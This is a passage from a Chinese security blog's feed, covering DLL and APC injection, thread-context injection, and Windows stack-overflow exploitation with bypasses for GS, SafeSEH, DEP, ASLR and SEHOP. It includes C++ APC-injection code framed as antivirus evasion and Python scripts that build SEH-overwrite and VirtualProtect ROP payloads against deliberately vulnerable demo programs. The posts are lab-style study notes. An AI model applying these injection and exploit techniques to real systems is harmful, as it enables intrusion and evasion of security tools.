/></p><p>通过阅读这个函数的代码发现</p><ol><li>使用<code>_ReturnAddress</code>获得调用完成的返回地址，反推初DLL的基地址</li><li>通过PEB得到<code>LoadLibraryA</code>、<code>GetProcAddress</code>、<code>VirtualAlloc</code>，使用<code>NtFlushInstructionCache</code>暂时存储其他导入表的函数</li><li>迁移之前的DLL镜像到新的位置</li><li>覆写迁移后的文件头的节区位置</li><li>使用刚才导入的<code>LoadLibraryA</code>、<code>GetProcAddress</code>修复IAT</li><li>处理重定向相关</li><li>找到DLLMain并跳转后执行</li></ol><h1 id="apc注入"><a class="markdownIt-Anchor" href="#apc注入"></a> APC注入</h1><p>在最开始的远程线程调用注入使用的是<code>TH32CS_SNAPPROCESS</code>，这里就是利用<code>KiUserDispatch</code>调度进行APC例程调用，让线程使用<code>LoadLibarary</code>进行注入</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">THREADENTRY32 te = &#123; <span class="built_in">sizeof</span>(THREADENTRY32) &#125;;</span><br><span class="line">HANDLE hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hThreadSnap) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Error In APC Injection\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">BOOL bStat = FALSE;</span><br><span class="line"><span class="comment">//得到第一个线程</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Thread32First</span>(hThreadSnap, &amp;te)) &#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (te.th32OwnerProcessID == <span class="keyword">this</span>-&gt;dwPid) &#123;</span><br><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line"><span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">DWORD dwRet = <span class="built_in">QueueUserAPC</span>((PAPCFUNC)LoadLibraryW, hThread, (ULONG_PTR)pAddress);</span><br><span class="line"><span class="keyword">if</span> (dwRet &gt; <span class="number">0</span>)bStat = TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadSnap);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/54c47164be9d9b6e6bf4a8a34377b787.png" alt="image-20230718092010464" /></p><p>还有一个技巧就是使用NTDLL中的未导出函数<code>NtTestAlert</code>就可以立即调用APC例程</p><p><strong>上面的把<code>hProcess = GetCurrentProcess()</code>，<code>pAddress = shellcode_Address</code>相当于使用DLL注入进行免杀了</strong></p><h1 id="上下文注入"><a class="markdownIt-Anchor" href="#上下文注入"></a> 上下文注入</h1><p>之前在写PE加载器的时候就想到了这个，主要是通过暂停程序，获得并修改上下文，在内存中写入shellcode，然后再恢复就行了</p><p>问题在于shellcode还有计算各种偏移，个人觉得涉及shellcode和汇编较多，就不再本篇文章赘述</p><p>用到的主要WINAPI就是</p><ol><li>创建会shellcode裸函数（<code>__declspec(naked)</code>）,导出<code>LoadLibrary</code>等函数</li><li><code>OpenProcess</code>后再<code>OpenThread</code>，使用<code>SuspendThread</code>暂停线程</li><li>创建类型为<code>CONTEXT</code>的变量，初始化<code>context.ContextFlags=CONTEXT_FULL</code></li><li><code>GetThreadContext</code>获得上下文</li><li><code>VirualAlloc</code>获得空间，类似<code>RtlMoveMemory</code>这种复制shellcode到空间</li><li>将<code>context.eip = shellcode_addr</code>，使用<code>SetThreadContext</code>重新设置上下文，<code>ResumeThread</code>恢复线程</li></ol><p>内核中的过程差不多，不过更多的是不一样的API</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;DLL 注入进化史&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="C" scheme="https://joe1sn.eu.org/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】基础栈溢出保护绕过</title>
    <link href="https://joe1sn.eu.org/2023/07/12/win-pwn-stack2/"/>
    <id>https://joe1sn.eu.org/2023/07/12/win-pwn-stack2/</id>
    <published>2023-07-12T14:29:58.000Z</published>
    <updated>2023-07-13T12:25:05.423Z</updated>
    
    <content type="html"><![CDATA[<p>针对栈攻击的防护与绕过</p><span id="more"></span><h1 id="gs"><a class="markdownIt-Anchor" href="#gs"></a> GS</h1><p>GS本质上和Linux GCC中的canary很相似，他在栈帧的结尾（EBP之前）插入一给<code>DWORD</code>类型的值，其副本存在于<code>.data</code>中。</p><p><img src="https://img.joe1sn.top/uploads/big/b3c288e6425290fda519c82da1cad2d8.png" alt="image-20230712223606947" /></p><p>在编译的时候并不会存在GS保护有下面几种情况</p><ul><li>函数不包含缓冲区</li><li>函数被定义为具有变量参数列表</li><li>函数使用无保护的关键字标记</li><li>函数在第一个语句中包含内嵌汇编代码</li><li>缓冲区不是 8 字节类型且大小不大于 4 个字节</li></ul><p>不过仍然可以采用<code>#pragma strict_gs_check </code>强制启用GS保护</p><p><img src="https://img.joe1sn.top/uploads/big/750aa691ce894524469f1b01cd77e309.png" alt="image-20230712230456568" /></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vulfuction</span><span class="params">(<span class="type">char</span>* str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arry[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(arry, str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span>* str = <span class="string">&quot;yeah,i have GS protection&quot;</span>;</span><br><span class="line">vulfuction(str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/51469c6f21d21998618b65975dac846d.png" alt="image-20230712231538824" /></p><p><img src="https://img.joe1sn.top/uploads/big/374afa04add92f9d9522083ab2cb45ac.png" alt="image-20230712231847170" /></p><p>绕过方式要漏洞类型灵活选择</p><ul><li><p>如果是可以泄露那么泄露后拼接再溢出</p></li><li><p>再C++中，<code>struct</code>和<code>class</code>除了访问权限没有不同，那么有机会可以通过修改函数指针（比如虚函数）来进行RCE</p></li><li><p>如果存在任意地址写或者能过写道<code>.data</code>段（比如存在字符串格式化漏洞），可以将对比的cookie设置为特定值</p><p><img src="https://img.joe1sn.top/uploads/big/2b71e1f69270fdfb33074a2c981321bc.png" alt="image-20230713081622450" /></p><p><img src="https://img.joe1sn.top/uploads/big/acce2fb38f039e66a5257f69f0ee9336.png" alt="image-20230713082958542" /></p></li><li><p>GS机制没有存在SEH的保护，所以 <strong>【Win Pwn】基础栈溢出利用</strong> 中的利用手段仍然能够成功，只是溢出长度和ROP的Gadget需要重新设置。</p><p><img src="https://img.joe1sn.top/uploads/big/1e013c016c634b7c9b510528f57f7f11.png" alt="image-20230713000747391" /></p><p><img src="https://img.joe1sn.top/uploads/big/db77970446f88fc23cfb89501cc7f235.png" alt="image-20230713000801579" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x160</span>-<span class="built_in">len</span>(shellcode)-<span class="number">16</span>) <span class="comment">#0x1c</span></span><br><span class="line">test_func = <span class="string">b&quot;\xc4\x16\x40\x00&quot;</span> <span class="comment">#004016C4</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\x9e\x26\x41\x00&quot;</span>    <span class="comment">#0041269E</span></span><br><span class="line"></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x2c\x07\x00\x00\xFF\xE0&quot;</span></span><br><span class="line">                                                        <span class="comment"># mov eax, esp</span></span><br><span class="line">                                                        <span class="comment"># sub eax, 0x64c;//sub eax, 0x608</span></span><br><span class="line">                                                        <span class="comment"># jmp eax</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">16</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/2a8a0b38238c8d4b55c053daf8d7f822.png" alt="image-20230713081020816" /></p></li></ul><h1 id="safeseh"><a class="markdownIt-Anchor" href="#safeseh"></a> SafeSEH</h1><p>0day那本书上信息有点…过时了，这里可以参考微软的官方定义<a href="https://learn.microsoft.com/zh-cn/cpp/build/reference/safeseh-image-has-safe-exception-handlers?view=msvc-170"><code>/SAFESEH</code>（映像具有安全异常处理程序）</a>，主要识别方法就是在<code>.rdata</code>中存在<code>IMAGE_LOAD_CONFIG_DIRECTORY32_2</code></p><p><img src="https://img.joe1sn.top/uploads/big/79a4334e1d29d557df4e66527b98c69a.png" alt="image-20230713090918752" /></p><p>通过<code>RtlDispatchException</code>函数实现</p><p><img src="https://img.joe1sn.top/uploads/big/dae06c1a5f9088ea1eed84fbfbbfca68.png" alt="image-20230713091103788" /></p><p>比较通杀的方法就是</p><ul><li>不使用SEH</li><li>在堆区上布置shellcode然后执行</li></ul><p>这里改动一下源代码</p><ol><li><p>把SEH的地址手动改为堆地址</p><p><img src="https://img.joe1sn.top/uploads/big/e8047ce0aa682162a04e464d06cb447e.png" alt="image-20230713093246026" /></p></li><li><p>经过校验后直接到堆中执行了</p><p><img src="https://img.joe1sn.top/uploads/big/23640b0c2f51bb770ee04be0cd63bf20.png" alt="image-20230713093529382" /></p><p><img src="https://img.joe1sn.top/uploads/big/5b3318808a12b59116c30bef0ff5c1ac.png" alt="image-20230713093751706" /></p><p>P3是重启了一次后截图，地址可能会不一样</p></li></ol><p>总结一下就是地址的ROP必须符合验证的权限，但是<strong>没有开启SafeSEH的DLL文件中的Gadget</strong>、没有<strong>DEP时候的堆地址</strong>都可以使用。</p><h1 id="dep"><a class="markdownIt-Anchor" href="#dep"></a> DEP</h1><p>DEP是类似于Windows上的NX，作用是禁止堆栈的数据拥有执行的权限，避免了Shellcode直接执行。</p><p>操作系统通过设置内存页的 NX/XD 属性标记，来指明不能从该内存执行代码。为了实现 这个功能，需要在内存的页面表（Page T able）中加入一个特殊的标识位（NX/XD）来标识是 否允许在该页上执行指令。当该标识位设置为 0 里表示这个页面允许执行指令，设置为 1 时表 示该页面不允许执行指令。</p><p>关于NX保护也可以手动查看</p><p><img src="https://img.joe1sn.top/uploads/big/e91415d0cafe28798ab17cbdfff475bb.png" alt="image-20230713095059334" /></p><p>只编译DEP可能还需要关闭运行时检查</p><p><img src="https://img.joe1sn.top/uploads/big/2ace5c957abc3787e65922ccf1a7e343.png" alt="image-20230713133201425" /></p><p>主要思路就是Ret2Libc</p><ul><li><p>调用<code>ZwSetInformationProcess</code>关闭DEP</p><p>在之前的《【win内核原理与实现】II. 进程与线程》中提到过<code>_KPROCESS</code>存在<code>ExecuteOptions</code></p><p><img src="https://img.joe1sn.top/uploads/big/b4d51d5aa29ea68f1f9a32053f3e6b20.png" alt="image-20230713100758503" /></p><p>我并没有在微软的官网上找到该结构体的说明，但是可以通过之前他们的逆向结果找到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Pos0 ExecuteDisable        :<span class="number">1b</span>it </span><br><span class="line">Pos1 ExecuteEnable         :<span class="number">1b</span>it </span><br><span class="line">Pos2 DisableThunkEmulation :<span class="number">1b</span>it </span><br><span class="line">Pos3 Permanent             :<span class="number">1b</span>it </span><br><span class="line">Pos4 ExecuteDispatchEnable :<span class="number">1b</span>it </span><br><span class="line">Pos5 ImageDispatchEnable   :<span class="number">1b</span>it </span><br><span class="line">Pos6 Spare                 :<span class="number">2b</span>it</span><br></pre></td></tr></table></figure><p>当前进程 DEP 开启时 ExecuteDisable 位被置 1，当 进程 DEP 关闭时 ExecuteEnable 位被置 1，DisableThunkEmulation 是为了兼容 ATL 程序设置的， Permanent 被置 1 后表示这些标志都不能再被修改。真正影响 DEP 状态是前两位，所以我们只 要将_KEXECUTE_OPTIONS 的值设置为 0x02（二进制为 00000010）就可以将 ExecuteEnable 置为 1。</p><p>使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE; </span><br><span class="line">ZwSetInformationProcess( </span><br><span class="line"> NtCurrentProcess(),    <span class="comment">// (HANDLE)-1 </span></span><br><span class="line"> ProcessExecuteFlags,   <span class="comment">// 0x22 </span></span><br><span class="line"> &amp;ExecuteFlags,         <span class="comment">// ptr to 0x2 </span></span><br><span class="line"> <span class="keyword">sizeof</span>(ExecuteFlags)); <span class="comment">// 0x4 </span></span><br></pre></td></tr></table></figure><p>就可以关掉DEP保护了，在0day书中介绍了3种直接利用兼容性异常而导致DEP关闭的方法</p><blockquote><p>（1）当 DLL 受 SafeDisc 版权保护系统保护时；</p><p>（2）当 DLL 包含有.aspcak、.pcle、.sforce 等字节时；</p><p>（3）Windows V ista 下面当 DLL 包含在注册表“HKEY_LOCAL_MACHINE\SOFTWARE  \Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions”键下边标识 出不需要启动 DEP 的模块时</p></blockquote><p>很可惜在windows10中这些情况几乎不会出现，所以方法不适用</p></li></ul><p>这两种是我比较喜欢用的，因为可以和免杀结合在一起</p><p>他们的基础就是类似LinuxPwn中的ROP构造，这里我使用的是32下，cdcle调用方式，使用栈传参</p><ul><li><p><code>VirtualProtect</code>改写内存权限</p><p>关于函数的用法：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">virtualProtect 函数 (memoryapi.h)</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualProtect</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  LPVOID lpAddress,</span></span><br><span class="line"><span class="params">  [in]  SIZE_T dwSize,</span></span><br><span class="line"><span class="params">  [in]  DWORD  flNewProtect,</span></span><br><span class="line"><span class="params">  [out] PDWORD lpflOldProtect</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>lpAddress</code>:  要改变属性的内存起始地址。</p><p><code>dwSize</code>:  要改变属性的内存区域大小。</p><p><code>flNewProtect</code>:  内存新的属性类型，设置为 PAGE_EXECUTE_READWRITE（0x40）时该 内存页为可读可写可执行。</p><p><code>pflOldProtect</code>:  内存原始属性类型保存地址。 修改内存属性成功时函数返回非 0，修改失败时返回 0。</p><p>不过API位于的是<code>shell32.dll</code>当中，所以要添加上<code>HINSTANCE hInst = LoadLibrary(L&quot;shell32.dll&quot;);</code></p><p>由于ROP依赖于函数调用的传参方式，下面是一个经典的传参</p><p><img src="https://img.joe1sn.top/uploads/big/ed81eaf5da5e42ca1bfb625c694f5216.png" alt="image-20230713193232979" /></p><p>ROP时栈的结构</p><p><img src="https://img.joe1sn.top/uploads/big/54294658ba1a5556fff36100908b0736.png" alt="image-20230713193507826" /></p><p>由于没有泄露点，所以只能在调试的时候修改。也可以使用Gadget来构造，比如说通过<code>ESP</code>相关得到栈地址之类的。（但是得到<code>VirtualProtect</code>就太困难了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*<span class="number">0x14</span></span><br><span class="line">payload = offset </span><br><span class="line">payload += <span class="string">b&quot;\x90&quot;</span>*<span class="number">4</span>    <span class="comment">#VirtualProtect</span></span><br><span class="line">payload += <span class="string">b&quot;\x80&quot;</span>*<span class="number">4</span>    <span class="comment">#Shellcode Address</span></span><br><span class="line">payload += <span class="string">b&quot;\x80&quot;</span>*<span class="number">4</span>    <span class="comment">#Shellcode Address</span></span><br><span class="line">payload += <span class="string">b&quot;\xff\x00\x00\x00&quot;</span>  <span class="comment">#Address Length</span></span><br><span class="line">payload += <span class="string">b&quot;\x40\x00\x00\x00&quot;</span>  <span class="comment">#PAGE_EXECUTE_READWRITE</span></span><br><span class="line">payload += <span class="string">b&quot;\x38\xa0\x41\x00&quot;</span>  <span class="comment">#0041A038</span></span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/a68c0c2af42ae0d17c84c82d9d2db5b0.png" alt="image-20230713195003967" /></p></li><li><p><code>VirtualAlloc</code>来开辟可执行的内存然后执行shellcode</p><p>和<code>VirtualProtect</code>一样的道理，不过需要使用复制的payload将shellcode复制到可执行的内存中</p></li></ul><h1 id="aslr"><a class="markdownIt-Anchor" href="#aslr"></a> ASLR</h1><p>在绕过DEP保护中需要调试的时候才能写入函数地址的原因就是这些函数的DLL使用了ASLR保护，导致函数每次加载的基地址不同，所以无法使用固定地址。</p><p>绕过思路主要有</p><ul><li>低位覆盖，最低位是固定的</li><li>堆喷，将内存初始化后的<code>\x0c</code>强制写为<code>\x90</code>（<code>nop</code>的汇编），这样程序进入了任意的地址都能滑行到shellcode。（扩大伤害面）</li></ul><h1 id="sehop"><a class="markdownIt-Anchor" href="#sehop"></a> SEHOP</h1><p>由于SEH是链式的，所以他会顺着链表检查，如果最后一个不为系统固定的终极异常处理函数就直接不执行。</p><p><img src="https://img.joe1sn.top/uploads/big/5319fbefe0a46939d4d853e4debc9e4f.png" alt="image-20230713201332561" /></p><p>最直接有效的就是伪造SEH链，由于只会验证最后一个，只满足这个条件就可以了</p><p>由于SEHOP在SafeSEH之前，所以绕过过后还需要继续绕过SafeSEH</p><p><img src="https://img.joe1sn.top/uploads/big/f99910e357fc63d939677ac967101038.png" alt="image-20230713201648035" /></p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p>《0day安全：软件漏洞分析技术》</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;针对栈攻击的防护与绕过&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】基础栈溢出利用</title>
    <link href="https://joe1sn.eu.org/2023/07/08/win-pwn-stack/"/>
    <id>https://joe1sn.eu.org/2023/07/08/win-pwn-stack/</id>
    <published>2023-07-08T08:39:36.000Z</published>
    <updated>2023-07-08T10:18:47.929Z</updated>
    
    <content type="html"><![CDATA[<p>[Win Pwn] 基础栈溢出利用</p><p>window下无保护的栈溢出加载shellcode</p><span id="more"></span><h1 id="程序"><a class="markdownIt-Anchor" href="#程序"></a> 程序</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)))</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"></span><br><span class="line">str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">vuln();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在windows下的防护等级有</p><ul><li><code>ASLR</code><ul><li><code>/DYNAMICBASE</code> 带有剥离的重定位条目边缘情况</li><li><code>/HIGHENTROPYVA</code> for 64-bit systems</li></ul></li><li><code>Code integrity/signing:</code><ul><li><code>/INTEGRITYCHECK</code></li><li>使用有效（可信、活动）证书进行 Authenticode 签名（Linux 目前不支持）</li></ul></li><li><code>DEP</code><ul><li>别称：<code>W^X</code>, <code>NX</code></li></ul></li><li><code>Manifest isolation</code><ul><li><code>/ALLOWISOLATION</code></li></ul></li><li><code>SEH</code>和<code>SafeEH</code><ul><li><code>SEH</code>=<code>Structured Exception Handling</code></li></ul></li><li><code>Control Flow Guard</code>和<code>Return Flow Guard instrumentation</code></li><li><code>Stack cookie</code><ul><li><code>/GS</code></li></ul></li></ul><ol><li><p>ASLR：与Linux的PIE相同，指地址随机化，将在程序启动时将DLL随机的加载到内存中的未知，自Windows 10开始已经在系统中被配置为默认启动；</p></li><li><p>High Entropy VA：高熵64位地址空间布局随机化，开启后标识此程序的随机化取值空间为64 bit，这会导致攻击者更难去推测随机化后的地址；</p></li><li><p>Force Integrity：强制签名保护，开启后标识程序加载时需要验证其中的前命，如果签名不正确，程序将会被阻止运行；</p></li><li><p>Isolation：隔离保护，开启后表示此程序加载时将会在一个相对独立的隔离环境中被加载，从而阻止攻击者过度提升权限；</p></li><li><p>NX/DEP/PAE：NX保护指的是内存页不可运行。属于系统级的内存保护功能，能够将一页或多页标记为不可执行，从而防止从该内存区域运行代码，以帮助防止利用缓冲区溢出。防止代码在数据页面（例如堆、栈和内存池）中运行，在Windows中常称为DEP。</p><p>PAE指物理地址拓展，PAE是一项处理器功能，使x86处理器可以在部分windows版本上访问4 GB以上的物理内存。在基于x86的系统上运行的某些32位版本的Windows Server可以使用PAE访问最多64 GB或128 GB的物理内存，具体取决于处理器的物理地址大小。使用PAE，操作系统将从两级线性地址转换为三级地址转换。两级线性地址转换将线性地址拆分为3个独立的字段索引到内存表中，三级地址转换将其拆分为4个独立的字段：一个2位字段，两个9位字段和一个12位字段。PAE模式下的页表条目(PTE)和页目录条目(PDE)的大小从32位增加到64位。附加位允许操作系统PTE或PDE引用4 GB以上的物理内存，同时PAE将允许在基于x86的系统上运行32位windows中启用DEP等功能。</p></li><li><p><code>SEHOP</code>：即结构化异常处理保护(structured Exception Handling Overwrite Protection)，这个保护能够防止攻击者利用结构化异常处理来进行进一步的利用。</p></li><li><p><code>CFG</code>：即控制流防护这项技术通过在间接跳转前插入校验代码，检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点，最终及时有效的进行异常处理，避免引发相关的安全问题。</p></li><li><p>RFG：即返回地址防护，在每个函数头部将返回地址保存到 <code>fs:[rsp](thread control stack)</code>，并在函数返回前将其与栈上返回地址进行比较，从而有效阻止攻击；</p></li><li><p>SafeSEH：安全结构化异常处理(Safe Structured Exception Handlers)，白名单版的安全沙箱，定义一些异常处理程序，并基于此构造安全结构化异常处理表，程序运行后，安全结构化异常处理表之外的异常处理程序将会被阻止运行；</p></li><li><p>GS：类似于Linux中的Canary保护，开启后，会在返回地址和BP之前压入一个额外的 <code>Security Cookie</code>，系统会比较栈中的这个值和原先存放在 <code>.data</code>中的值做一个比较，如果两者不吻合，则说明发生了栈溢出；</p></li><li><p>Authenticode：签名保护；</p></li><li><p>.NET：DLL混淆级保护</p></li></ol><p>你可以查看文件头进行识别，也可以使用winchecksec进行识别</p><p><img src="https://img.joe1sn.top/uploads/big/325814dc1fa1572df0f97d5b7bd3ddfa.png" alt="image-20230707130719644" /></p><p>非常明显的漏洞点</p><h1 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h1><p>GCC编译<code>gcc .\main.c -o shellcode</code></p><p><img src="https://img.joe1sn.top/uploads/big/c55686928835d42421d7f6c0656f5cff.png" alt="image-20230707130122963" /></p><p>先试一下跳转，加上覆盖ebp的空间大小是<code>0x1c</code></p><p><img src="https://img.joe1sn.top/uploads/big/46eaa11d681dcd3c33a4b431e30b2c79.png" alt="image-20230707131904489" /></p><h1 id="加载shellcode"><a class="markdownIt-Anchor" href="#加载shellcode"></a> 加载shellcode</h1><p>现在想办法布置shellcode，由于没有后门函数所以需要利用SEH进行shellcode的布置。</p><p><strong>栈中的 SEH Handle 存储的形式</strong></p><p><img src="https://img.joe1sn.top/uploads/big/eb18a130a41aa85ce5a74b3ef1d61905.png" alt="img" /></p><p>基本的布置方式如下，实战的可以参考<a href="https://blog.joe1sn.top/2021/05/18/CVE-2019-9766/">CVE-2019-9766简单栈溢出</a></p><p><img src="https://img.joe1sn.top/uploads/big/8a8a4e2f63396305958ac9645adb7c9a.png" alt="img" /></p><p>使用<strong>x32dbg</strong>调试得到SEH链，然后得出payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 